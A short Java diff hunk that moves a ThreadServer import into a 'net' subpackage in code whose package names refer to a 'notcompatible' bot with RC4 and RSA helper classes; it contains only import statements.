@@ -7,9 +7,9 @@ import java.nio.channels.Selector;
 import java.nio.channels.SocketChannel;
 import java.util.logging.Logger;
 
-import diff.notcompatible.c.bot.ThreadServer;
 import diff.notcompatible.c.bot.crypto.RC4;
 import diff.notcompatible.c.bot.crypto.RSA;
+import diff.notcompatible.c.bot.net.ThreadServer;
 import diff.notcompatible.c.bot.objects.HubListItem;
 import diff.notcompatible.c.bot.objects.MyBuffer;
 import diff.notcompatible.c.bot.objects.Packet;
